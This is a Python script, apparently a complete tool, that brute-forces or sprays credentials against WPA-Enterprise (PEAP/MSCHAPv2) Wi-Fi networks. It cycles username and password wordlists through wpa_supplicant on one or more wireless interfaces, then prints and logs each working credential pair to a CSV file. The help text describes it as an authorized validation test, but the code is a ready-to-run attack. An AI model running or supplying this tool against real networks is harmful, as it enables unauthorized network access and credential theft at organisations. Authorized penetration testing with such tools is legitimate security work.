#!/usr/bin/env python3

import argparse
import csv
import datetime
import importlib
import os
import queue
import sys
import threading
import time
from contextlib import suppress


DEFAULT_MAX_WAIT = 4.5
DEFAULT_TEST_INTERVAL = 0.05


def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            return [
                line.rstrip("\r\n")
                for line in handle
                if line.rstrip("\r\n")
            ]
    except OSError as exc:
        raise SystemExit(f"Unable to read {path}: {exc}") from exc


def build_attempts(users, passwords, start):
    attempt_id = 0

    for password in passwords:
        for user_index in range(start, len(users)):
            yield attempt_id, user_index, users[user_index], password
            attempt_id += 1


def initialize_output_file(path):
    if not path:
        return

    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8", newline="") as handle:
            writer = csv.writer(handle)
            writer.writerow(
                ["timestamp", "ssid", "username", "password"]
            )

    with suppress(OSError):
        os.chmod(path, 0o600)


def write_valid_credential(
    outfile,
    ssid,
    username,
    password,
    csv_lock,
):
    if not outfile:
        return

    with csv_lock:
        with open(outfile, "a", encoding="utf-8", newline="") as handle:
            writer = csv.writer(handle)
            writer.writerow(
                [
                    timestamp(),
                    ssid,
                    username,
                    password,
                ]
            )


def remove_configured_networks(interface):
    for network in interface.get_networks():
        if network is None:
            continue

        with suppress(Exception):
            interface.remove_network(network.get_path())


def connect_to_wifi(
    *,
    ssid,
    password,
    username,
    interface,
    outfile,
    print_lock,
    csv_lock,
    max_wait,
    test_interval,
):
    network_object = None

    with print_lock:
        print(
            f"Trying {username}:{password}...",
            flush=True,
        )

    network_params = {
        "ssid": ssid,
        "key_mgmt": "WPA-EAP",
        "eap": "PEAP",
        "identity": username,
        "password": password,
        "phase2": "auth=MSCHAPV2",
    }

    try:
        remove_configured_networks(interface)

        network_object = interface.add_network(network_params)
        network_path = network_object.get_path()

        interface.select_network(network_path)

        deadline = time.monotonic() + max_wait

        while time.monotonic() < deadline:
            state = interface.get_state()

            if state == "completed":
                with print_lock:
                    print(
                        f"[+] VALID CREDENTIALS: "
                        f"{username}:{password}",
                        flush=True,
                    )

                write_valid_credential(
                    outfile=outfile,
                    ssid=ssid,
                    username=username,
                    password=password,
                    csv_lock=csv_lock,
                )

                return True

            time.sleep(test_interval)

        return False

    finally:
        with suppress(Exception):
            interface.disconnect_network()

        if network_object is not None:
            with suppress(Exception):
                interface.remove_network(
                    network_object.get_path()
                )


def get_or_create_interface(supplicant, device):
    try:
        return supplicant.get_interface(device)
    except Exception:
        return supplicant.create_interface(device)


def worker(
    *,
    worker_id,
    device,
    driver_class,
    reactor,
    args,
    attempts,
    stop_event,
    print_lock,
    csv_lock,
    errors,
):
    interface = None

    try:
        driver = driver_class(reactor)
        supplicant = driver.connect()
        interface = get_or_create_interface(
            supplicant,
            device,
        )

        with print_lock:
            print(
                f"[*] {device}: worker-{worker_id} ready",
                flush=True,
            )

    except Exception as exc:
        with print_lock:
            print(
                f"[!] {device}: unable to initialize: {exc}",
                flush=True,
            )

        errors.append((device, exc))
        stop_event.set()
        return

    try:
        while not stop_event.is_set():
            try:
                (
                    attempt_id,
                    user_index,
                    username,
                    password,
                ) = attempts.get_nowait()

            except queue.Empty:
                break

            try:
                with print_lock:
                    print(
                        f"[{user_index}] "
                        f"({device}/worker-{worker_id}) ",
                        end="",
                        flush=True,
                    )

                valid = connect_to_wifi(
                    ssid=args.ssid,
                    username=str(username),
                    password=str(password),
                    interface=interface,
                    outfile=args.outfile,
                    print_lock=print_lock,
                    csv_lock=csv_lock,
                    max_wait=args.max_wait,
                    test_interval=args.test_interval,
                )

                if valid and args.stop_on_success:
                    stop_event.set()
                    break

                if args.attempt_delay > 0:
                    time.sleep(args.attempt_delay)

            except Exception as exc:
                with print_lock:
                    print(
                        f"[!] {device}/worker-{worker_id} "
                        f"failed attempt {attempt_id}: {exc}",
                        flush=True,
                    )

            finally:
                attempts.task_done()

    finally:
        if interface is not None:
            with suppress(Exception):
                interface.disconnect_network()


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description=(
            "Perform an authorized online PEAP/MSCHAPv2 "
            "credential validation test."
        ),
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument(
        "-i",
        required=True,
        dest="devices",
        metavar="interface[,interface...]",
        help="Wireless interface or comma-separated interfaces",
    )

    parser.add_argument(
        "-e",
        required=True,
        dest="ssid",
        help="Target SSID",
    )

    parser.add_argument(
        "-u",
        required=True,
        dest="userfile",
        help="Username wordlist",
    )

    parser.add_argument(
        "-P",
        dest="password",
        default=None,
        help="Single password to test",
    )

    parser.add_argument(
        "-p",
        dest="passfile",
        default=None,
        help="Password wordlist",
    )

    parser.add_argument(
        "-s",
        dest="start",
        type=int,
        default=0,
        metavar="INDEX",
        help="Zero-based username index to resume from",
    )

    parser.add_argument(
        "-w",
        dest="outfile",
        default=None,
        metavar="CSV_FILE",
        help="Save valid credentials to a CSV file",
    )

    parser.add_argument(
        "-1",
        dest="stop_on_success",
        action="store_true",
        help="Stop after the first valid credential",
    )

    parser.add_argument(
        "-t",
        dest="attempt_delay",
        type=float,
        default=0.5,
        metavar="SECONDS",
        help="Delay between attempts per worker",
    )

    parser.add_argument(
        "--max-wait",
        dest="max_wait",
        type=float,
        default=DEFAULT_MAX_WAIT,
        metavar="SECONDS",
        help="Maximum wait time per attempt",
    )

    parser.add_argument(
        "--test-interval",
        dest="test_interval",
        type=float,
        default=DEFAULT_TEST_INTERVAL,
        metavar="SECONDS",
        help="State polling interval",
    )

    return parser.parse_args(argv)


def validate_args(args):
    if args.password is None and args.passfile is None:
        raise SystemExit(
            "Specify either -P PASSWORD or -p PASSWORD_FILE."
        )

    if args.password is not None and args.passfile is not None:
        raise SystemExit(
            "Specify either -P or -p, not both."
        )

    if args.start < 0:
        raise SystemExit(
            "The start index must be zero or greater."
        )

    if args.max_wait <= 0:
        raise SystemExit(
            "--max-wait must be greater than zero."
        )

    if args.test_interval <= 0:
        raise SystemExit(
            "--test-interval must be greater than zero."
        )

    if args.attempt_delay < 0:
        raise SystemExit(
            "-t/--attempt-delay cannot be negative."
        )


def load_runtime_dependencies():
    required_modules = (
        "twisted",
        "txdbus",
        "wpa_supplicant",
        "service_identity",
    )

    missing = []

    for module_name in required_modules:
        try:
            importlib.import_module(module_name)
        except ImportError:
            missing.append(module_name)

    if missing:
        raise SystemExit(
            "Missing runtime dependencies: "
            + ", ".join(missing)
            + "\nInstall twisted, txdbus, wpa_supplicant, "
              "service_identity, and pyOpenSSL."
        )

    try:
        from twisted.internet.selectreactor import SelectReactor
        from wpa_supplicant.core import WpaSupplicantDriver

    except AttributeError as exc:
        if "GEN_EMAIL" in str(exc):
            raise SystemExit(
                "Incompatible pyOpenSSL/cryptography versions detected.\n"
                "Install a current pyOpenSSL package compatible with "
                "your cryptography version."
            ) from exc

        raise SystemExit(
            f"Runtime dependency API error: {exc}"
        ) from exc

    except Exception as exc:
        raise SystemExit(
            f"Unable to load Twisted/wpa_supplicant: {exc}"
        ) from exc

    return SelectReactor, WpaSupplicantDriver


def main(argv=None):
    args = parse_args(argv or sys.argv[1:])
    validate_args(args)

    devices = [
        device.strip()
        for device in args.devices.split(",")
        if device.strip()
    ]

    if not devices:
        raise SystemExit(
            "At least one wireless interface is required."
        )

    if len(devices) != len(set(devices)):
        raise SystemExit(
            "Duplicate wireless interfaces were specified."
        )

    users = load_wordlist(args.userfile)

    if not users:
        raise SystemExit(
            "The username file is empty."
        )

    if args.start >= len(users):
        raise SystemExit(
            "The start index is beyond the username list."
        )

    passwords = (
        load_wordlist(args.passfile)
        if args.passfile
        else [args.password]
    )

    if not passwords:
        raise SystemExit(
            "The password list is empty."
        )

    initialize_output_file(args.outfile)

    attempts = queue.Queue()

    for attempt in build_attempts(
        users=users,
        passwords=passwords,
        start=args.start,
    ):
        attempts.put(attempt)

    print_lock = threading.Lock()
    csv_lock = threading.Lock()
    stop_event = threading.Event()
    errors = []

    select_reactor_class, driver_class = (
        load_runtime_dependencies()
    )

    reactor = select_reactor_class()

    reactor_thread = threading.Thread(
        target=reactor.run,
        kwargs={"installSignalHandlers": 0},
        daemon=True,
        name="twisted-reactor",
    )

    reactor_thread.start()

    deadline = time.monotonic() + 5

    while not reactor.running and time.monotonic() < deadline:
        time.sleep(0.05)

    if not reactor.running:
        raise SystemExit(
            "Twisted reactor failed to start."
        )

    threads = []

    try:
        print(
            f"[*] Running {len(devices)} workers.",
            flush=True,
        )

        for worker_id, device in enumerate(devices, start=1):
            thread = threading.Thread(
                target=worker,
                kwargs={
                    "worker_id": worker_id,
                    "device": device,
                    "driver_class": driver_class,
                    "reactor": reactor,
                    "args": args,
                    "attempts": attempts,
                    "stop_event": stop_event,
                    "print_lock": print_lock,
                    "csv_lock": csv_lock,
                    "errors": errors,
                },
                name=f"worker-{worker_id}",
            )

            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        if errors:
            print(
                "[!] One or more workers failed to initialize.",
                flush=True,
            )
            return 1

        print(
            "[*] DONE!",
            flush=True,
        )

        return 0

    except KeyboardInterrupt:
        stop_event.set()

        print(
            "\n[!] Attack stopped by user.",
            flush=True,
        )

        return 130

    finally:
        if reactor.running:
            reactor.callFromThread(reactor.stop)

        reactor_thread.join(timeout=5)


if __name__ == "__main__":
    sys.exit(main())
